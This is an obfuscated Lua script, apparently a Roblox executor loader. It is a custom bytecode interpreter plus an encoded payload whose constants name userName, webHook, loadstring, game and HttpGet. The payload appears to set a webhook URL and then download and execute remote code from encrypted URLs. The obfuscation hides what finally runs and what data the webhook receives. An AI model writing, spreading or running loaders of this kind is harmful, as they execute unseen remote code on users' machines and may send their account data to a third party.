local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v24,v25) local v26={};for v41=1, #v24 do v6(v26,v0(v4(v1(v2(v24,v41,v41 + 1 )),v1(v2(v25,1 + (v41% #v25) ,1 + (v41% #v25) + 1 )))%256 ));end return v5(v26);end local v8=tonumber;local v9=string.byte;local v10=string.char;local v11=string.sub;local v12=string.gsub;local v13=string.rep;local v14=table.concat;local v15=table.insert;local v16=math.ldexp;local v17=getfenv or function() return _ENV;end ;local v18=setmetatable;local v19=pcall;local v20=select;local v21=unpack or table.unpack ;local v22=tonumber;local function v23(v27,v28,...) local v29=1;local v30;v27=v12(v11(v27,5),v7("\0\94","\26\46\112\87"),function(v42) if (v9(v42,2)==79) then v30=v8(v11(v42,1,2 -1 ));return "";else local v103=0;local v104;while true do if (0==v103) then v104=v10(v8(v42,16));if v30 then local v125=v13(v104,v30);v30=nil;return v125;else return v104;end break;end end end end);local function v31(v43,v44,v45) if v45 then local v105=0;local v106;while true do if (v105==0) then v106=(v43/(2^(v44-1)))%(2^(((v45-1) -(v44-1)) + (2 -1))) ;return v106-(v106%(1 -0)) ;end end else local v107=0;local v108;while true do if (v107==0) then v108=2^(v44-1) ;return (((v43%(v108 + v108))>=v108) and 1) or 0 ;end end end end local function v32() local v46=0;local v47;while true do if (v46==0) then v47=v9(v27,v29,v29);v29=v29 + 1 ;v46=1;end if (v46==1) then return v47;end end end local function v33() local v48=0;local v49;local v50;while true do if (v48==1) then return (v50 * (659 -403)) + v49 ;end if (0==v48) then v49,v50=v9(v27,v29,v29 + 2 );v29=v29 + 2 ;v48=1;end end end local function v34() local v51=0;local v52;local v53;local v54;local v55;while true do if (v51==0) then v52,v53,v54,v55=v9(v27,v29,v29 + 3 );v29=v29 + (623 -(555 + 64)) ;v51=1;end if (v51==1) then return (v55 * 16777216) + (v54 * 65536) + (v53 * 256) + v52 ;end end end local function v35() local v56=0;local v57;local v58;local v59;local v60;local v61;local v62;while true do if (v56==1) then v59=1;v60=(v31(v58,1,20) * (2^32)) + v57 ;v56=2;end if (v56==3) then if (v61==0) then if (v60==0) then return v62 * 0 ;else local v126=0;while true do if (v126==0) then v61=1;v59=0;break;end end end elseif (v61==2047) then return ((v60==0) and (v62 * (1/0))) or (v62 * NaN) ;end return v16(v62,v61-(1954 -(857 + 74)) ) * (v59 + (v60/(2^(620 -(367 + 201))))) ;end if (v56==0) then v57=v34();v58=v34();v56=1;end if (v56==2) then v61=v31(v58,21,31);v62=((v31(v58,32)==1) and  -1) or 1 ;v56=3;end end end local function v36(v63) local v64=0;local v65;local v66;while true do if (v64==0) then v65=nil;if  not v63 then local v118=0;while true do if (v118==0) then v63=v34();if (v63==(927 -(214 + 713))) then return "";end break;end end end v64=1;end if (1==v64) then v65=v11(v27,v29,(v29 + v63) -1 );v29=v29 + v63 ;v64=2;end if (v64==3) then return v14(v66);end if (v64==2) then v66={};for v111=1, #v65 do v66[v111]=v10(v9(v11(v65,v111,v111)));end v64=3;end end end local v37=v34;local function v38(...) return {...},v20("#",...);end local function v39() local v67={};local v68={};local v69={};local v70={v67,v68,nil,v69};local v71=v34();local v72={};for v80=1 + 0 ,v71 do local v81=0;local v82;local v83;while true do if (v81==0) then v82=v32();v83=nil;v81=1;end if (v81==1) then if (v82==1) then v83=v32()~=0 ;elseif (v82==2) then v83=v35();elseif (v82==3) then v83=v36();end v72[v80]=v83;break;end end end v70[1 + 2 ]=v32();for v84=1,v34() do local v85=0;local v86;while true do if (v85==0) then v86=v32();if (v31(v86,1,1)==0) then local v121=v31(v86,2,880 -(282 + 595) );local v122=v31(v86,4,6);local v123={v33(),v33(),nil,nil};if (v121==0) then local v127=0;while true do if (v127==0) then v123[3 + 0 ]=v33();v123[4]=v33();break;end end elseif (v121==1) then v123[3 -0 ]=v34();elseif (v121==(1067 -(68 + 997))) then v123[3]=v34() -(2^16) ;elseif (v121==3) then local v138=0;while true do if (v138==0) then v123[3]=v34() -(2^16) ;v123[4]=v33();break;end end end if (v31(v122,1,1)==1) then v123[2]=v72[v123[2]];end if (v31(v122,2,1272 -(226 + 1044) )==1) then v123[3]=v72[v123[3]];end if (v31(v122,3,3)==1) then v123[17 -13 ]=v72[v123[4]];end v67[v84]=v123;end break;end end end for v87=1,v34() do v68[v87-1 ]=v39();end return v70;end local function v40(v74,v75,v76) local v77=v74[1];local v78=v74[119 -(32 + 85) ];local v79=v74[3];return function(...) local v89=v77;local v90=v78;local v91=v79;local v92=v38;local v93=1;local v94= -1;local v95={};local v96={...};local v97=v20("#",...) -1 ;local v98={};local v99={};for v109=0,v97 do if (v109>=v91) then v95[v109-v91 ]=v96[v109 + 1 ];else v99[v109]=v96[v109 + 1 ];end end local v100=(v97-v91) + 1 ;local v101;local v102;while true do local v110=0;while true do if (v110==1) then if (v102<=19) then if (v102<=9) then if (v102<=4) then if (v102<=1) then if (v102>0) then for v193=v101[2 + 0 ],v101[3] do v99[v193]=nil;end else local v139=0;local v140;local v141;local v142;local v143;while true do if (v139==1) then v94=(v142 + v140) -1 ;v143=0;v139=2;end if (v139==0) then v140=v101[2];v141,v142=v92(v99[v140](v21(v99,v140 + 1 ,v101[3])));v139=1;end if (v139==2) then for v397=v140,v94 do local v398=0;while true do if (v398==0) then v143=v143 + 1 + 0 ;v99[v397]=v141[v143];break;end end end break;end end end elseif (v102<=2) then v99[v101[2]]=v101[3]~=(957 -(892 + 65)) ;elseif (v102==3) then local v200=0;local v201;local v202;local v203;while true do if (v200==0) then v201=v101[2];v202=v99[v201 + 2 ];v200=1;end if (v200==1) then v203=v99[v201] + v202 ;v99[v201]=v203;v200=2;end if (2==v200) then if (v202>0) then if (v203<=v99[v201 + 1 ]) then local v474=0;while true do if (v474==0) then v93=v101[7 -4 ];v99[v201 + 3 ]=v203;break;end end end elseif (v203>=v99[v201 + 1 ]) then v93=v101[3];v99[v201 + 3 ]=v203;end break;end end elseif (v99[v101[2]]==v101[4]) then v93=v93 + 1 ;else v93=v101[3];end elseif (v102<=6) then if (v102>5) then local v145=v101[2];do return v21(v99,v145,v94);end else local v146=0;while true do if (v146==2) then v101=v89[v93];v99[v101[2]]=v99[v101[3]][v101[4]];v93=v93 + 1 ;v101=v89[v93];v146=3;end if (v146==3) then v99[v101[2]]=v76[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[182 -(67 + 113) ]]=v99[v101[3]][v101[4]];v146=4;end if (v146==1) then v93=v93 + 1 ;v101=v89[v93];v99[v101[3 -1 ]]=v76[v101[3]];v93=v93 + (351 -(87 + 263)) ;v146=2;end if (v146==0) then v99[v101[2]]=v76[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v99[v101[3]][v101[6 -2 ]];v146=1;end if (v146==5) then v101=v89[v93];if  not v99[v101[2]] then v93=v93 + 1 ;else v93=v101[3];end break;end if (v146==4) then v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v76[v101[3]];v93=v93 + 1 ;v146=5;end end end elseif (v102<=7) then local v147=v101[2];v99[v147]=v99[v147](v21(v99,v147 + 1 ,v101[3]));elseif (v102==8) then do return v99[v101[2 + 0 ]]();end else v99[v101[2]]=v76[v101[7 -4 ]];end elseif (v102<=14) then if (v102<=11) then if (v102==10) then v76[v101[3]]=v99[v101[2]];else v99[v101[2]]=v99[v101[3]][v101[3 + 1 ]];end elseif (v102<=12) then local v153=0;local v154;local v155;local v156;while true do if (1==v153) then v156=v99[v154 + 2 ];if (v156>0) then if (v155>v99[v154 + 1 ]) then v93=v101[3];else v99[v154 + (11 -8) ]=v155;end elseif (v155<v99[v154 + 1 ]) then v93=v101[3];else v99[v154 + (955 -(802 + 150)) ]=v155;end break;end if (v153==0) then v154=v101[2];v155=v99[v154];v153=1;end end elseif (v102>(34 -21)) then v99[v101[2]]=v99[v101[3]] + v101[4] ;elseif  not v99[v101[2]] then v93=v93 + 1 ;else v93=v101[3];end elseif (v102<=16) then if (v102>15) then if v99[v101[2]] then v93=v93 + 1 ;else v93=v101[3];end else v99[v101[3 -1 ]]=v99[v101[3]]%v101[4] ;end elseif (v102<=17) then v99[v101[2]]=v101[3];elseif (v102>18) then local v208=v101[2];v99[v208]=v99[v208](v21(v99,v208 + 1 + 0 ,v94));else local v210=0;local v211;local v212;while true do if (1==v210) then for v441=v211 + (998 -(915 + 82)) ,v94 do v15(v212,v99[v441]);end break;end if (v210==0) then v211=v101[2];v212=v99[v211];v210=1;end end end elseif (v102<=29) then if (v102<=24) then if (v102<=21) then if (v102>20) then v99[v101[2]]= #v99[v101[3]];else v99[v101[2]]=v101[8 -5 ] + v99[v101[4]] ;end elseif (v102<=22) then local v162=v101[2];local v163,v164=v92(v99[v162](v21(v99,v162 + 1 + 0 ,v94)));v94=(v164 + v162) -1 ;local v165=0;for v195=v162,v94 do v165=v165 + 1 ;v99[v195]=v163[v165];end elseif (v102>(29 -6)) then v99[v101[2]]={};else v99[v101[2]]=v75[v101[3]];end elseif (v102<=26) then if (v102>25) then v99[v101[2]]();else local v166=v101[2];v99[v166](v21(v99,v166 + 1 ,v94));end elseif (v102<=(1214 -(1069 + 118))) then local v167=0;local v168;local v169;local v170;while true do if (v167==1) then v170={};v169=v18({},{[v7("\134\28\162\122\187\186\93","\212\217\67\203\20\223\223\37")]=function(v401,v402) local v403=v170[v402];return v403[1][v403[2]];end,[v7("\133\178\166\215\173\132\166\214\191\149","\178\218\237\200")]=function(v404,v405,v406) local v407=0;local v408;while true do if (v407==0) then v408=v170[v405];v408[1][v408[2]]=v406;break;end end end});v167=2;end if (v167==2) then for v409=1,v101[4] do local v410=0;local v411;while true do if (v410==0) then v93=v93 + 1 ;v411=v89[v93];v410=1;end if (v410==1) then if (v411[1]==28) then v170[v409-1 ]={v99,v411[3]};else v170[v409-1 ]={v75,v411[3]};end v98[ #v98 + 1 ]=v170;break;end end end v99[v101[2]]=v40(v168,v169,v76);break;end if (0==v167) then v168=v90[v101[3]];v169=nil;v167=1;end end elseif (v102==28) then v99[v101[2]]=v99[v101[3]];else v99[v101[2]]=v99[v101[3]]%v99[v101[4]] ;end elseif (v102<=(73 -39)) then if (v102<=31) then if (v102>30) then local v171=0;local v172;local v173;local v174;local v175;while true do if (1==v171) then v93=v93 + (1 -0) ;v101=v89[v93];v99[v101[2]]=v75[v101[3 + 0 ]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v75[v101[794 -(368 + 423) ]];v93=v93 + 1 ;v171=2;end if (v171==9) then v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v99[v101[3]] + v101[4] ;v93=v93 + 1 ;v101=v89[v93];v175=v101[2];v173,v174=v92(v99[v175](v21(v99,v175 + 1 ,v101[3])));v171=10;end if (v171==8) then v99[v101[2]]= #v99[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v99[v101[3]]%v99[v101[446 -(416 + 26) ]] ;v93=v93 + (3 -2) ;v101=v89[v93];v99[v101[2]]=v101[3] + v99[v101[4]] ;v171=9;end if (v171==7) then v101=v89[v93];v99[v101[2]]=v99[v101[3]]%v99[v101[4]] ;v93=v93 + (3 -2) ;v101=v89[v93];v99[v101[2]]=v101[3] + v99[v101[4]] ;v93=v93 + 1 ;v101=v89[v93];v171=8;end if (0==v171) then v172=nil;v173,v174=nil;v175=nil;v99[v101[2]]=v99[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[1 + 1 ]]=v75[v101[3]];v171=1;end if (v171==12) then v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v99[v101[3]]%v101[4] ;v93=v93 + 1 ;v101=v89[v93];v175=v101[2];v173,v174=v92(v99[v175](v99[v175 + 1 ]));v171=13;end if (4==v171) then v173,v174=v92(v99[v175](v21(v99,v175 + 1 ,v101[3])));v94=(v174 + v175) -1 ;v172=0;for v412=v175,v94 do local v413=0;while true do if (0==v413) then v172=v172 + 1 ;v99[v412]=v173[v172];break;end end end v93=v93 + (19 -(10 + 8)) ;v101=v89[v93];v175=v101[2];v171=5;end if (v171==10) then v94=(v174 + v175) -(1 + 0) ;v172=0;for v414=v175,v94 do v172=v172 + 1 ;v99[v414]=v173[v172];end v93=v93 + (1 -0) ;v101=v89[v93];v175=v101[2];v173,v174=v92(v99[v175](v21(v99,v175 + 1 ,v94)));v171=11;end if (3==v171) then v99[v101[2]]=v99[v101[9 -6 ]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v99[v101[3]] + v101[4] ;v93=v93 + 1 ;v101=v89[v93];v175=v101[2];v171=4;end if (v171==2) then v101=v89[v93];v99[v101[2]]=v75[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v99[v101[3]];v93=v93 + 1 ;v101=v89[v93];v171=3;end if (v171==6) then v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v99[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]= #v99[v101[3]];v93=v93 + 1 ;v171=7;end if (v171==13) then v94=(v174 + v175) -(431 -(44 + 386)) ;v172=0;for v417=v175,v94 do local v418=0;while true do if (0==v418) then v172=v172 + 1 ;v99[v417]=v173[v172];break;end end end v93=v93 + 1 ;v101=v89[v93];v175=v101[2];v99[v175](v21(v99,v175 + (1487 -(998 + 488)) ,v94));break;end if (v171==11) then v94=(v174 + v175) -1 ;v172=0;for v419=v175,v94 do local v420=0;while true do if (v420==0) then v172=v172 + (439 -(145 + 293)) ;v99[v419]=v173[v172];break;end end end v93=v93 + 1 ;v101=v89[v93];v175=v101[2];v99[v175]=v99[v175](v21(v99,v175 + 1 ,v94));v171=12;end if (v171==5) then v99[v175]=v99[v175](v21(v99,v175 + 1 ,v94));v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v75[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v75[v101[3]];v171=6;end end else local v176=v101[2];do return v99[v176](v21(v99,v176 + 1 ,v101[3]));end end elseif (v102<=32) then local v177=0;local v178;local v179;local v180;local v181;while true do if (v177==6) then if (v99[v101[2]]==v101[776 -(201 + 571) ]) then v93=v93 + 1 ;else v93=v101[3];end break;end if (v177==5) then v181=v101[2];v99[v181]=v99[v181](v21(v99,v181 + 1 ,v94));v93=v93 + 1 + 0 ;v101=v89[v93];v177=6;end if (0==v177) then v178=nil;v179,v180=nil;v181=nil;v99[v101[2]]=v101[3];v177=1;end if (v177==4) then v178=0;for v421=v181,v94 do local v422=0;while true do if (0==v422) then v178=v178 + 1 ;v99[v421]=v179[v178];break;end end end v93=v93 + 1 ;v101=v89[v93];v177=5;end if (v177==3) then v101=v89[v93];v181=v101[2];v179,v180=v92(v99[v181](v21(v99,v181 + 1 ,v101[3])));v94=(v180 + v181) -1 ;v177=4;end if (v177==2) then v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v101[1 + 2 ];v93=v93 + 1 ;v177=3;end if (v177==1) then v93=v93 + 1 ;v101=v89[v93];v181=v101[2];v99[v181]=v99[v181](v21(v99,v181 + 1 ,v101[3]));v177=2;end end elseif (v102>33) then local v219=v101[2];local v220,v221=v92(v99[v219](v99[v219 + 1 ]));v94=(v221 + v219) -1 ;local v222=0;for v320=v219,v94 do local v321=0;while true do if (v321==0) then v222=v222 + 1 ;v99[v320]=v220[v222];break;end end end else local v223;local v224;local v225,v226;local v227;v99[v101[2]]=v75[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v75[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v75[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]={};v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v75[v101[3]];v93=v93 + (1139 -(116 + 1022)) ;v101=v89[v93];v99[v101[2]]=v99[v101[12 -9 ]];v93=v93 + 1 ;v101=v89[v93];for v322=v101[2],v101[3] do v99[v322]=nil;end v93=v93 + 1 ;v101=v89[v93];v227=v101[2];v225,v226=v92(v99[v227](v21(v99,v227 + 1 ,v101[3])));v94=(v226 + v227) -1 ;v224=0 + 0 ;for v324=v227,v94 do local v325=0;while true do if (v325==0) then v224=v224 + 1 ;v99[v324]=v225[v224];break;end end end v93=v93 + 1 ;v101=v89[v93];v227=v101[7 -5 ];v223=v99[v227];for v326=v227 + 1 ,v94 do v15(v223,v99[v326]);end end elseif (v102<=36) then if (v102==35) then local v182=0;local v183;local v184;local v185;while true do if (v182==3) then v99[v101[2]]=v101[3];v93=v93 + 1 ;v101=v89[v93];v185=v101[2];v182=4;end if (v182==4) then v184=v99[v185];v183=v99[v185 + 2 ];if (v183>0) then if (v184>v99[v185 + 1 ]) then v93=v101[3];else v99[v185 + 3 ]=v184;end elseif (v184<v99[v185 + 1 ]) then v93=v101[3];else v99[v185 + 3 ]=v184;end break;end if (v182==2) then v101=v89[v93];v99[v101[2]]= #v99[v101[3]];v93=v93 + 1 ;v101=v89[v93];v182=3;end if (v182==1) then v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v101[3];v93=v93 + 1 ;v182=2;end if (v182==0) then v183=nil;v184=nil;v185=nil;v99[v101[2]]={};v182=1;end end else v93=v101[10 -7 ];end elseif (v102<=37) then local v187=0;local v188;local v189;local v190;local v191;local v192;while true do if (v187==0) then v188=nil;v189,v190=nil;v191=nil;v192=nil;v99[v101[2]]=v101[3];v93=v93 + (860 -(814 + 45)) ;v101=v89[v93];v99[v101[2]]=v101[3];v93=v93 + 1 ;v187=1;end if (v187==5) then v99[v101[3 -1 ]]=v75[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v101[3];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v101[3];v93=v93 + 1 ;v101=v89[v93];v187=6;end if (9==v187) then v192=v101[2];v191=v99[v101[3]];v99[v192 + 1 ]=v191;v99[v192]=v191[v101[4]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v75[v101[9 -6 ]];v93=v93 + 1 ;v101=v89[v93];v187=10;end if (v187==3) then v99[v192]=v99[v192](v21(v99,v192 + 1 ,v101[2 + 1 ]));v93=v93 + 1 ;v101=v89[v93];v76[v101[3]]=v99[v101[2]];v93=v93 + (886 -(261 + 624)) ;v101=v89[v93];v99[v101[2]]=v76[v101[3]];v93=v93 + 1 ;v101=v89[v93];v187=4;end if (v187==4) then v99[v101[2]]=v76[v101[3]];v93=v93 + 1 ;v101=v89[v93];v192=v101[2];v191=v99[v101[3]];v99[v192 + 1 ]=v191;v99[v192]=v191[v101[4]];v93=v93 + 1 ;v101=v89[v93];v187=5;end if (v187==13) then v93=v101[1750 -(760 + 987) ];break;end if (v187==6) then v192=v101[2];v99[v192]=v99[v192](v21(v99,v192 + 1 ,v101[3]));v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v101[3]~=0 ;v93=v93 + 1 ;v101=v89[v93];v192=v101[2];v189,v190=v92(v99[v192](v21(v99,v192 + (1081 -(1020 + 60)) ,v101[3])));v187=7;end if (v187==8) then v99[v101[1425 -(630 + 793) ]]();v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v76[v101[3]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v76[v101[3]];v93=v93 + 1 ;v101=v89[v93];v187=9;end if (2==v187) then v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v101[3];v93=v93 + 1 + 0 ;v101=v89[v93];v99[v101[2]]=v101[3];v93=v93 + 1 ;v101=v89[v93];v192=v101[2];v187=3;end if (v187==12) then v93=v93 + 1 ;v101=v89[v93];v192=v101[2];v99[v192]=v99[v192](v21(v99,v192 + (3 -2) ,v94));v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]();v93=v93 + 1 ;v101=v89[v93];v187=13;end if (v187==1) then v101=v89[v93];v192=v101[4 -2 ];v99[v192]=v99[v192](v21(v99,v192 + 1 ,v101[3]));v93=v93 + 1 ;v101=v89[v93];v76[v101[3]]=v99[v101[2]];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v75[v101[3]];v187=2;end if (v187==10) then v99[v101[2]]=v101[3];v93=v93 + 1 ;v101=v89[v93];v99[v101[2]]=v101[3];v93=v93 + 1 ;v101=v89[v93];v192=v101[2];v189,v190=v92(v99[v192](v21(v99,v192 + 1 ,v101[3])));v94=(v190 + v192) -(4 -3) ;v187=11;end if (v187==7) then v94=(v190 + v192) -1 ;v188=0;for v423=v192,v94 do local v424=0;while true do if (v424==0) then v188=v188 + 1 ;v99[v423]=v189[v188];break;end end end v93=v93 + 1 ;v101=v89[v93];v192=v101[2];v99[v192]=v99[v192](v21(v99,v192 + 1 ,v94));v93=v93 + 1 ;v101=v89[v93];v187=8;end if (11==v187) then v188=0;for v425=v192,v94 do local v426=0;while true do if (v426==0) then v188=v188 + 1 ;v99[v425]=v189[v188];break;end end end v93=v93 + 1 + 0 ;v101=v89[v93];v192=v101[2];v189,v190=v92(v99[v192](v21(v99,v192 + 1 ,v94)));v94=(v190 + v192) -1 ;v188=0;for v427=v192,v94 do local v428=0;while true do if (0==v428) then v188=v188 + 1 ;v99[v427]=v189[v188];break;end end end v187=12;end end elseif (v102>38) then local v235=0;local v236;local v237;while true do if (v235==0) then v236=v101[2];v237=v99[v101[3]];v235=1;end if (1==v235) then v99[v236 + 1 ]=v237;v99[v236]=v237[v101[4]];break;end end else do return;end end v93=v93 + 1 ;break;end if (v110==0) then v101=v89[v93];v102=v101[1];v110=1;end end end end;end return v40(v39(),{},v28)(...);end return v23("LOL!0D3O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403053O006D6174636803083O00746F6E756D62657203053O007063612O6C00243O0012053O00013O00206O000200122O000100013O00202O00010001000300122O000200013O00202O00020002000400122O000300053O00062O0003000A000100010004243O000A0001001209000300063O00200B000400030007001209000500083O00200B000500050009001209000600083O00200B00060006000A00061B00073O000100062O001C3O00064O001C8O001C3O00044O001C3O00014O001C3O00024O001C3O00053O001209000800013O00200B00080008000B0012090009000C3O001209000A000D3O00061B000B0001000100052O001C3O00074O001C3O00094O001C3O00084O001C3O000A4O001C3O000B4O001C000C000B4O0008000C00014O0006000C6O00263O00013O00023O00023O00026O00F03F026O00704002264O002300025O00122O000300016O00045O00122O000500013O00042O0003002100012O001700076O001F000800026O000900016O000A00026O000B00036O000C00046O000D8O000E00063O00202O000F000600014O000C000F6O000B3O00024O000C00036O000D00046O000E00016O000F00016O000F0006000F00102O000F0001000F4O001000016O00100006001000102O00100001001000202O0010001000014O000D00106O000C8O000A3O000200202O000A000A00024O0009000A6O00073O00010004030003000500012O0017000300054O001C000400024O001E000300044O000600036O00263O00017O00043O00027O004003053O003A25642B3A2O033O0025642B026O00F03F001C3O00061B5O000100012O00178O0021000100016O000200026O000300026O00048O000500036O00068O000700076O000500076O00043O000100200B000400040001001220000500026O00030005000200122O000400036O000200046O00013O000200262O00010018000100040004243O001800012O001C00016O001800026O001E000100024O000600015O0004243O001B00012O0017000100044O0008000100014O000600016O00263O00013O00013O000E3O0003083O00757365724E616D65030A3O00C8CCD63CE1AEDE19C8C603083O007EB1A3BB4586DBA703073O00776562482O6F6B03793O002BD93ED5EF798265C1F530CE25D7F86DCE25C8B322DD238AEB26CF22CAF328DE6594AE7B9D7E9CAE70947A94A97B947C97AA7B9465CDD474F83BC6F4269B23EADB2BE803E3C934EF22ECD709947BEBFA1C9C3CD5FA02FE3AC1EF16CA09ECFF73C732EBF273EF7ACBC408C20BCAAE1B981FD7FD20FC67E6AC1703053O009C43AD4AA5030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403553O003CA35D06AF7C097BA54801F2214F20BF5C14A9354326B44618A8234820F94A19B1696C3BAE5A02B5254D24BB480FAF695627AE4A1EB5250B3BB45D19F12F4822B24702B529487BBA481FB2695F35A5411BF22A533503073O002654D72976DC4603433O0058023602ED0A596D00FF4758251BEA58032007ED5504211DF044132C06B053192F5DCD5E19350BC80459141EF142062O11EC59063601B15D172B1CB17D3B705CF2451703053O009E30764272026O00F03F01243O0006103O002200013O0004243O002200012O001700015O001225000200023O00122O000300036O00010003000200122O000100016O00015O00122O000200053O00122O000300066O00010003000200122O000100043O00122O000100073O00122O000200083O00202O0002000200094O00045O00122O0005000A3O00122O0006000B6O0004000600024O00058O000200056O00013O00024O00010001000100122O000100073O00122O000200083O00202O0002000200094O00045O00122O0005000C3O00122O0006000D6O000400066O00028O00013O00024O00010001000100044O0023000100200B00013O000E2O00263O00017O00",v17(),...);